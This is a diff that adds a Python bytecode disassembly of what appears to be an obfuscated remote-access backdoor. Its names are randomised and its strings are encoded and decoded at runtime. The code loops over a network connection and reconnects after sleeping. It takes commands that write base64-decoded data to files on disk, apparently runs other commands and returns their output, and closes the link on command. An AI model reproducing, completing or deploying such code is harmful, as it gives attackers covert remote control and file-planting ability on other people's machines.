+           1026 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1036 LOAD_CONST              19 ('u6ixs6CxsKugubCqsbs=')
+           1038 CALL                     1
+           1046 CALL                     2
+           1054 POP_TOP
+
+129        1056 LOAD_GLOBAL             27 (NULL + Mx7iR4)
+           1066 LOAD_FAST                5 (Jx6aS4)
+           1068 CALL                     1
+           1076 POP_TOP
+           1078 EXTENDED_ARG             1
+           1080 JUMP_FORWARD           430 (to 1942)
+
+131     >> 1082 LOAD_FAST                6 (Tb8bJ5)
+           1084 LOAD_ATTR               31 (NULL|self + startswith)
+           1104 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1114 LOAD_CONST              20 ('qq+zu6C5trO63w==')
+           1116 CALL                     1
+           1124 CALL                     1
+           1132 POP_JUMP_IF_FALSE      254 (to 1642)
+
+132        1134 LOAD_FAST                6 (Tb8bJ5)
+           1136 LOAD_ATTR               33 (NULL|self + split)
+           1156 LOAD_CONST              14 (2)
+           1158 KW_NAMES                15 (('maxsplit',))
+           1160 CALL                     1
+           1168 STORE_FAST               7 (Yq3cK7)
+
+133        1170 LOAD_GLOBAL             35 (NULL + len)
+           1180 LOAD_FAST                7 (Yq3cK7)
+           1182 CALL                     1
+           1190 LOAD_CONST              14 (2)
+           1192 COMPARE_OP              92 (>=)
+           1196 EXTENDED_ARG             1
+           1198 POP_JUMP_IF_FALSE      371 (to 1942)
+
+134        1200 LOAD_GLOBAL             27 (NULL + Mx7iR4)
+           1210 LOAD_FAST                5 (Jx6aS4)
+           1212 CALL                     1
+           1220 STORE_FAST              11 (Dr9hP3)
+
+135        1222 LOAD_FAST               11 (Dr9hP3)
+           1224 POP_JUMP_IF_FALSE      186 (to 1598)
+           1226 LOAD_FAST               11 (Dr9hP3)
+           1228 LOAD_ATTR               31 (NULL|self + startswith)
+           1248 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1258 LOAD_CONST              21 ('qq+zu6C7vqu+3w==')
+           1260 CALL                     1
+           1268 CALL                     1
+           1276 POP_JUMP_IF_FALSE      160 (to 1598)
+
+136        1278 LOAD_GLOBAL             47 (NULL + base64)
+           1288 LOAD_ATTR               52 (b64decode)
+           1308 LOAD_FAST               11 (Dr9hP3)
+           1310 LOAD_GLOBAL             35 (NULL + len)
+           1320 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1330 LOAD_CONST              21 ('qq+zu6C7vqu+3w==')
+           1332 CALL                     1
+           1340 CALL                     1
+           1348 LOAD_CONST               0 (None)
+           1350 BINARY_SLICE
+           1352 CALL                     1
+           1360 STORE_FAST              10 (Vn5eM9)
+
+137        1362 LOAD_GLOBAL             37 (NULL + os)
+           1372 LOAD_ATTR               54 (makedirs)
+           1392 LOAD_GLOBAL             36 (os)
+           1402 LOAD_ATTR               38 (path)
+           1422 LOAD_ATTR               57 (NULL|self + dirname)
+           1442 LOAD_FAST                7 (Yq3cK7)
+           1444 LOAD_CONST              16 (1)
+           1446 BINARY_SUBSCR
+           1450 CALL                     1
+           1458 LOAD_CONST               4 (True)
+           1460 KW_NAMES                22 (('exist_ok',))
+           1462 CALL                     2
+           1470 POP_TOP
+
+138        1472 LOAD_GLOBAL             43 (NULL + open)
+           1482 LOAD_FAST                7 (Yq3cK7)
+           1484 LOAD_CONST              16 (1)
+           1486 BINARY_SUBSCR
+           1490 LOAD_CONST              23 ('wb')
+           1492 CALL                     2
+           1500 BEFORE_WITH
+           1502 STORE_FAST               9 (f)
+
+139        1504 LOAD_FAST                9 (f)
+           1506 LOAD_ATTR               59 (NULL|self + write)
+           1526 LOAD_FAST               10 (Vn5eM9)
+           1528 CALL                     1
+           1536 POP_TOP
+
+138        1538 LOAD_CONST               0 (None)
+           1540 LOAD_CONST               0 (None)
+           1542 LOAD_CONST               0 (None)
+           1544 CALL                     2
+           1552 POP_TOP
+
+140     >> 1554 LOAD_GLOBAL             21 (NULL + Jl9eN3)
+           1564 LOAD_FAST                5 (Jx6aS4)
+           1566 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1576 LOAD_CONST              24 ('qq+zu6C+vLQ=')
+           1578 CALL                     1
+           1586 CALL                     2
+           1594 POP_TOP
+           1596 JUMP_FORWARD           172 (to 1942)
+
+142     >> 1598 LOAD_GLOBAL             21 (NULL + Jl9eN3)
+           1608 LOAD_FAST                5 (Jx6aS4)
+           1610 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1620 LOAD_CONST              25 ('qq+zu6C5vraz')
+           1622 CALL                     1
+           1630 CALL                     2
+           1638 POP_TOP
+           1640 JUMP_FORWARD           150 (to 1942)
+
+144     >> 1642 LOAD_FAST                6 (Tb8bJ5)
+           1644 LOAD_ATTR               31 (NULL|self + startswith)
+           1664 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1674 LOAD_CONST              26 ('vLK73w==')
+           1676 CALL                     1
+           1684 CALL                     1
+           1692 POP_JUMP_IF_FALSE       64 (to 1822)
+
+145        1694 LOAD_GLOBAL             21 (NULL + Jl9eN3)
+           1704 LOAD_FAST                5 (Jx6aS4)
+           1706 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1716 LOAD_CONST              27 ('sKqrr6qr34TPgt+EzoI=')
+           1718 CALL                     1
+           1726 LOAD_ATTR               23 (NULL|self + format)
+           1746 LOAD_FAST                4 (Lp7yH8)
+           1748 LOAD_GLOBAL             61 (NULL + Ve8sB7)
+           1758 LOAD_FAST                6 (Tb8bJ5)
+           1760 LOAD_CONST              28 (4)
+           1762 LOAD_CONST               0 (None)
+           1764 BINARY_SLICE
+           1766 LOAD_ATTR               63 (NULL|self + strip)
+           1786 CALL                     0
+           1794 CALL                     1
+           1802 CALL                     2
+           1810 CALL                     2
+           1818 POP_TOP
+           1820 JUMP_FORWARD            60 (to 1942)
+
+146     >> 1822 LOAD_FAST                6 (Tb8bJ5)
+           1824 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+           1834 LOAD_CONST              29 ('rLeqq7uwqLE=')
+           1836 CALL                     1
+           1844 COMPARE_OP              40 (==)
+           1848 POP_JUMP_IF_FALSE       46 (to 1942)
+
+147        1850 LOAD_GLOBAL             64 (sys)
+           1860 LOAD_ATTR               66 (stdout)
+           1880 LOAD_ATTR               69 (NULL|self + flush)
+           1900 CALL                     0
+           1908 POP_TOP
+
+148        1910 LOAD_FAST                5 (Jx6aS4)
+           1912 LOAD_ATTR               29 (NULL|self + close)
+           1932 CALL                     0
+           1940 POP_TOP
+
+113     >> 1942 EXTENDED_ARG             2
+           1944 JUMP_BACKWARD          695 (to 556)
+
+116     >> 1946 NOP
+
+152     >> 1948 NOP
+
+153        1950 LOAD_FAST_CHECK          5 (Jx6aS4)
+           1952 LOAD_ATTR               29 (NULL|self + close)
+           1972 CALL                     0
+           1980 POP_TOP
+
+156     >> 1982 LOAD_GLOBAL             25 (NULL + time)
+           1992 LOAD_ATTR               70 (sleep)
+           2012 LOAD_FAST                2 (Rz2zI1)
+           2014 CALL                     1
+           2022 POP_TOP
+
+100        2024 EXTENDED_ARG             3
+           2026 JUMP_BACKWARD         1006 (to 16)
+        >> 2028 SWAP                     2
+           2030 POP_TOP
+
+102        2032 SWAP                     2
+           2034 STORE_FAST               3 (_)
+           2036 RERAISE                  0
+        >> 2038 PUSH_EXC_INFO
+
+154        2040 POP_TOP
+
+155        2042 POP_EXCEPT
+           2044 RETURN_CONST             0 (None)
+        >> 2046 COPY                     3
+           2048 POP_EXCEPT
+           2050 RERAISE                  1
+
+123     >> 2052 PUSH_EXC_INFO
+           2054 WITH_EXCEPT_START
+           2056 POP_JUMP_IF_TRUE         1 (to 2060)
+           2058 RERAISE                  2
+        >> 2060 POP_TOP
+           2062 POP_EXCEPT
+           2064 POP_TOP
+           2066 POP_TOP
+           2068 EXTENDED_ARG             2
+           2070 JUMP_BACKWARD          611 (to 850)
+        >> 2072 COPY                     3
+           2074 POP_EXCEPT
+           2076 RERAISE                  1
+
+138     >> 2078 PUSH_EXC_INFO
+           2080 WITH_EXCEPT_START
+           2082 POP_JUMP_IF_TRUE         1 (to 2086)
+           2084 RERAISE                  2
+        >> 2086 POP_TOP
+           2088 POP_EXCEPT
+           2090 POP_TOP
+           2092 POP_TOP
+           2094 EXTENDED_ARG             1
+           2096 JUMP_BACKWARD          272 (to 1554)
+        >> 2098 COPY                     3
+           2100 POP_EXCEPT
+           2102 RERAISE                  1
+        >> 2104 PUSH_EXC_INFO
+
+149        2106 POP_TOP
+
+150        2108 POP_EXCEPT
+           2110 JUMP_BACKWARD           82 (to 1948)
+        >> 2112 COPY                     3
+           2114 POP_EXCEPT
+           2116 RERAISE                  1
+        >> 2118 PUSH_EXC_INFO
+
+154        2120 POP_TOP
+
+155        2122 POP_EXCEPT
+           2124 JUMP_BACKWARD           72 (to 1982)
+        >> 2126 COPY                     3
+           2128 POP_EXCEPT
+           2130 RERAISE                  1
+        >> 2132 PUSH_EXC_INFO
+
+152        2134 NOP
+
+153        2136 LOAD_FAST_CHECK          5 (Jx6aS4)
+           2138 LOAD_ATTR               29 (NULL|self + close)
+           2158 CALL                     0
+           2166 POP_TOP
+           2168 RERAISE                  0
+        >> 2170 PUSH_EXC_INFO
+
+154        2172 POP_TOP
+
+155        2174 POP_EXCEPT
+           2176 RERAISE                  0
+        >> 2178 COPY                     3
+           2180 POP_EXCEPT
+           2182 RERAISE                  1
+        >> 2184 COPY                     3
+           2186 POP_EXCEPT
+           2188 RERAISE                  1
+ExceptionTable:
+  18 to 84 -> 2104 [0]
+  86 to 160 -> 2028 [5]
+  162 to 472 -> 2104 [0]
+  478 to 508 -> 2038 [0]
+  512 to 798 -> 2104 [0]
+  800 to 832 -> 2052 [1] lasti
+  834 to 1500 -> 2104 [0]
+  1502 to 1536 -> 2078 [1] lasti
+  1538 to 1944 -> 2104 [0]
+  1946 to 1946 -> 2132 [0]
+  1950 to 1980 -> 2118 [0]
+  2028 to 2036 -> 2104 [0]
+  2038 to 2040 -> 2046 [1] lasti
+  2052 to 2060 -> 2072 [3] lasti
+  2062 to 2076 -> 2104 [0]
+  2078 to 2086 -> 2098 [3] lasti
+  2088 to 2102 -> 2104 [0]
+  2104 to 2106 -> 2112 [1] lasti
+  2108 to 2116 -> 2132 [0]
+  2118 to 2120 -> 2126 [1] lasti
+  2132 to 2132 -> 2184 [1] lasti
+  2136 to 2166 -> 2170 [2]
+  2168 to 2168 -> 2184 [1] lasti
+  2170 to 2172 -> 2178 [3] lasti
+  2174 to 2182 -> 2184 [1] lasti
